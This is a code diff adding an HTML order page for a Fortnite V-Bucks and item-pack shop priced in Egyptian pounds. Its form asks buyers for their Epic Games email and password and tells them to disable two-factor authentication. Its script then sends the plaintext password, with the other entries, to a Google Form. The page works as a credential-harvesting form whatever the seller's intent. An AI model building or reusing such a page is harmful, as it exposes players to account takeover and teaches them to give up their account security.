@@ -1,3 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order - Fortnite</title>
+    <link rel="stylesheet" href="css/ostyle.css">
+</head>
+<body>
+  <style>
+    body {
+      background-image: url('images/bg.png'); /* Replace with your image */
+      background-size: cover;
+      background-repeat: no-repeat;
+    }
+    .warning {
+      font-size: 0.9em;
+      color: red;
+    }
+    .back-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #007bff;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .back-button:hover {
+            background-color: #0056b3;
+        }
+  </style>
+      <!-- Back Button -->
+      <a href="index.html" class="back-button">Back to Main</a>
+  <div class="order-container">
+      <h2 class="text-center mb-4">Fortnite Order Form</h2>
+      <form id="orderForm">
+        <div class="form-checklist">
+          <label><input type="checkbox" value="380" class="item" data-name="1000 VB"> 1000 VB = 380 EGP</label><br>
+          <label><input type="checkbox" value="895" class="item" data-name="2800 VB"> 2800 VB = 895 EGP</label><br>
+          <label><input type="checkbox" value="1465" class="item" data-name="5000 VB"> 5000 VB = 1465 EGP</label><br>
+          <label><input type="checkbox" value="3050" class="item" data-name="13500 VB"> 13500 VB = 3050 EGP</label><br>
+          <label><input type="checkbox" value="250" class="item" data-name="Starter Pack"> Starter Pack = 250 EGP</label><br>
+          <label><input type="checkbox" value="200" class="item" data-name="Crew Pack"> Crew Pack = 200 EGP</label><br>
+          <label><input type="checkbox" value="800" class="item" data-name="Agency Renegades Pack"> Agency Renegades Pack = 800 EGP</label><br>
+          <label><input type="checkbox" value="200" class="item" data-name="Darkest Grumblings Pack"> Darkest Grumblings Pack = 200 EGP</label><br>
+          <label><input type="checkbox" value="700" class="item" data-name="Frozen Legends Pack"> Frozen Legends Pack = 700 EGP</label><br>
+          <label><input type="checkbox" value="720" class="item" data-name="Ghoul Punk Pack"> Ghoul Punk Pack = 720 EGP</label>
+        </div>
+        <div class="mt-3">
+          <p><strong>Selected Items: </strong><span id="selected-items">None</span></p>
+          <p><strong>Total: </strong>EGP <span id="total">0</span></p>
+        </div>
+        <div class="form-group">
+          <label>Phone Number:</label>
+          <input type="text" name="phone" class="form-control" id="phoneno" placeholder="Enter your phone number" required>
+        </div>
+        <div class="form-group">
+          <label>Epic Email:</label>
+          <input type="email" class="form-control" name="email" id="email" placeholder="Enter Epic Games Email" required>
+        </div>
+        <div class="form-group">
+          <label>Epic Password:</label>
+          <input type="password" class="form-control" id="pass" name="pass" placeholder="Enter Epic Games Password" required>
+        </div>
+        <div class="form-group">
+          <label>Money Transaction Image:</label>
+          <input type="file" name="image" id="image" class="form-control">
+        </div>
+        <p class="warning text-danger mt-3">
+          * Please disable 2FA before ordering. Any issues will be communicated via the phone number provided.
+        </p>
+        <button type="submit" class="btn btn-primary btn-block">Submit Order</button>
+      </form>
+    </div>
+    <footer class="site-footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 text-center">
+            <p>&copy; 2024 Mohamed Diaa and Y Store. All rights reserved.</p>
+          </div>
+        </div>
+      </div>
+    </footer>
 <script>
 document.getElementById("orderForm").addEventListener("submit", function (event) {
   event.preventDefault(); // Prevent the default form submission behavior
@@ -9,6 +96,7 @@ document.getElementById("orderForm").addEventListener("submit", function (event)
   const selectedItems = Array.from(document.querySelectorAll('.item:checked'))
     .map(item => item.dataset.name)
     .join(', ');
+  const totalPrice = calculateTotalPrice(); // Calculate the total price
   const imageFile = document.getElementById("image").files[0];
 
   // Imgur API upload
@@ -29,7 +117,7 @@ document.getElementById("orderForm").addEventListener("submit", function (event)
       if (data.success) {
         const imgurLink = data.data.link;
 
-        // Google Form entry identifiers (replace these with the actual IDs from your form)
+        // Google Form entry identifiers
         const googleFormUrl = "https://docs.google.com/forms/d/e/1FAIpQLSeMJr4-jccurhQc0V_h7LHnK-e3-S5JW8aUNOS4R3y1vDU5aw/formResponse";
         const formDataGoogle = new URLSearchParams();
         formDataGoogle.append("entry.1150364596", password); // Epic Password
@@ -59,22 +147,25 @@ document.getElementById("orderForm").addEventListener("submit", function (event)
     });
 });
 
-// Code for dynamically updating selected items and total
+// Calculate the total price dynamically
+function calculateTotalPrice() {
+  const items = document.querySelectorAll('.item:checked');
+  return Array.from(items).reduce((sum, item) => sum + parseInt(item.value), 0);
+}
+
+// Update total and selected items dynamically
 const items = document.querySelectorAll('.item');
 const selectedItemsElement = document.getElementById('selected-items');
 const totalElement = document.getElementById('total');
 
-// Update total and selected items dynamically
 function updateOrderSummary() {
   const selectedItems = Array.from(items)
     .filter(item => item.checked)
     .map(item => item.dataset.name);
-  const total = Array.from(items)
-    .filter(item => item.checked)
-    .reduce((sum, item) => sum + parseInt(item.value), 0);
+  const total = calculateTotalPrice();
 
   selectedItemsElement.textContent = selectedItems.length ? selectedItems.join(', ') : 'None';
-  totalElement.textContent = total;
+  totalElement.textContent = total.toLocaleString('en-EG', { style: 'currency', currency: 'EGP' });
 }
 
 items.forEach(item => item.addEventListener('change', updateOrderSummary));
@@ -82,3 +173,8 @@ items.forEach(item => item.addEventListener('change', updateOrderSummary));
 // Initialize summary
 updateOrderSummary();
 </script>
+
+
+    
+</body>
+</html>
